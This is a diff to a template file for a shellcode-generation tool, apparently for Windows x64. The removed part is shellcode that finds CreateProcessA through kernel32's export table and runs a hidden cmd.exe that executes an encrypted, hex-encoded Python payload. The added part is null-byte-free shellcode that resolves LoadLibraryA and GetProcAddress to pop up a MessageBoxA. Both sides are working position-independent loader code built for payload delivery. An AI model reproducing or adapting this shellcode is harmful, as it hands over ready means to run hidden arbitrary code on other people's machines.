@@ -1,29 +1,15 @@
-#!name##WEPy
+#!name##MsgBoxA
 #!types##scode
-#!info##A shellcode that uses the CreateProcessA function. By default, it launches CMD and injects a Python script into it. The shellcode includes a section for a Python payload, which will be automatically converted into hexadecimal values. You can also replace the default loader (code executor) with your own custom implementation.
+#!info##Generates shellcode that displays a MessageBoxA popup with the specified text, defaulting to "Hello World". The message box is displayed as an error-type window.
 #!NullBytes##True
 #!system_FLAG##[W]
 #!TAGS##[SCode]
-#!reqPayload##WEPy_script##Python script
-#!payloadOpt##WEPy_script##INCLUDE_IMPORTS##True##Include import library in code
-#!Payload##WEPy_script##step##return_code
-#!Payload##WEPy_script##step##encode_to_hex
-
-#!reqVar##WEPy_executor##How to run a python script. The '$' character denotes a script. Default: cmd.exe /C python -c exec(bytes.fromhex('$'))##str
-#!setVar##WEPy_executor##cmd.exe /C python -c exec(bytes.fromhex('$'))##str
-#!reqVar##WEPy_hide##A parameter that determines whether the CreateProcessA execution will run the code in a visible CMD window or keep it hidden. Accepts "True" or "False"; by default, the execution is hidden.##str
-#!setVar##WEPy_hide##True##str
+#!reqVar##MBA_msg##text to display##str
+#!setVar##MBA_msg##Hello World##str
 
 
+{% set MBA_text = TOOL.asm_stack_load(MBA_msg, registry="rcx", shadow_space_enter=40)%}
 
-
-{% set WEPy_evil_script = TOOL.cmd_build_loader(WEPy_script, WEPy_executor) %}
-
-{% if WEPy_hide == "True" %}
-%define SHOW_PROCESS 0x08000000
-{% else %}
-%define SHOW_PROCESS 0
-{% endif %}
 
 BITS 64
 
@@ -31,71 +17,86 @@ BITS 64
 section .text
 global main
 main:
-    ; CreateProcessA
-    mov rax, 0x000041737365636f
-    push rax
-    mov rax, 0x7250657461657243
-    push rax
-    mov rcx, rsp
-    lea rdx, [rel GetData]
-    jmp DuckTales
-
-GetData:
-    add rsp, 16
-    call CrProc
-    db {{TOOL.asm_hex_encrypt_bytes(WEPy_evil_script)}}
-
-CrProc:
-    pop r14 ; get args
-    mov r15, rax    ; save func addr
-    
-    ; create STARTUPINFO struct and fill zeros
-    sub rsp, 128    ; make 128 bytes
-    lea rdi, [rsp]    ; buff addr
-    mov ecx, 128  / 8   ; bytes number
-    xor rax, rax    ; value
-    ;cld
-    rep stosq
-    
-    lea r10, [rsp]  ; save pointer to struct. This same: mov r10, rsp
-    mov dword [r10], 104
-    
-    ; create PROCESS_INFORMATION structure and fill zeros
-    sub rsp, 32
-    mov rdi, rsp    ; buff addr
-    mov ecx, 32 / 8   ; bytes num
-    xor rax, rax
-    cld
-    rep stosq
-    
-    lea r11, [rsp]  ; save pointer to struct. This same: mov r10, rsp
-    
-
-    ; CreateProcessA
+    mov rbp, rsp; for correct debugging
+    mov r15, rsp    ; save stack
+    call exe
+    db {{TOOL.asm_hex_encrypt_bytes("MessageBoxA")}}
+        
+exe:
+    pop r15
+    mov rcx, r15
+    mov rdx, 0x0000000000006c6c
+    push rdx
+    mov rdx, 0x642e323372657355
+    push rdx
     mov rdx, rsp
-    sub rsp, 88
-    xor rcx, rcx
-    mov rdx, r14
-    mov r8, 0
-    mov r9, 0
-    mov qword [rsp+32], 0
-    mov qword [rsp+40], SHOW_PROCESS
-    mov qword [rsp+48], 0
-    mov qword [rsp+56], 0
-    mov [rsp+64], r10
-    mov [rsp+72], r11
-    call r15
+    sub rsp, 32
+    call Tales
+    add rsp, 32 + 16
     
-    add rsp, 88 + 160 
-  
+{{MBA_text[0]}}
+    mov rcx, rsp
+    
+    sub rsp, {{MBA_text[1]}}
+    mov rdx, rcx
+    mov r8, 0
+    mov rcx, 0
+    mov r9, 0
+    call rax
+    add rsp, {{MBA_text[2]}}
+    
+
     ret
 
 
-DuckTales:
-    ; find function name and back
+Tales:
+    ; IN: rcx - pointer to function name
+    ; IN: rdx - pointer to dll name
+    ; OUT: rax - function address
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx    ; func name
+    mov [rbp-16], rdx   ; dll name
+    
+    ; LoadLibraryA
+    mov rax, 0x41797261
+    push rax
+    mov rax, 0x7262694c64616f4c
+    push rax
+    mov rcx, rsp
+    sub rsp, 40
+    call Duck
+    mov rcx, [rbp-16]
+    call rax    ; call LoadLibraryA
+    mov [rbp-16], rax   ; save dll handle
+    add rsp, 40 + 16
+    
+    ; GetProcAddress
+    mov rcx, 0x0000737365726464
+    push rcx
+    mov rcx, 0x41636f7250746547
+    push rcx
+    mov rcx, rsp
+    sub rsp, 40
+    call Duck
+    mov rcx, [rbp-16]   ; module handle
+    mov rdx, [rbp-8]    ; func name
+    call rax    ; call GetProcAddress
+    add rsp, 40 + 16
+    
+    
+    .return:
+        add rsp, 16
+        pop rbp
+        ret
+        
+
+
+Duck:
+    ; find function name in kernel32
     ; Null bytes free
     ; IN: rcx - pointer to function name
-    ; IN: rdx - pointer to callback
     ; OUT: rax - function address
     
     push rbp
@@ -106,7 +107,7 @@ DuckTales:
     push r15
     sub rsp, 16     ; space for local variable
     mov [rbp-8], rcx    ; function name
-    mov [rbp-16], rdx   ; return address
+
     
     ; get kernel32 and Export Table address
     ; r14 - kernel32 addr
@@ -170,14 +171,13 @@ DuckTales:
         mov rax, rdi    ; return func addr
     
     .return:
-        mov rcx, [rbp-16]   ; return addr
         add rsp, 16 ; restore stack
         pop r15
         pop r14
         pop rdi
         pop rsi
         pop rbp
-        jmp rcx
+        ret
      
      .not_find:
         xor rax, rax
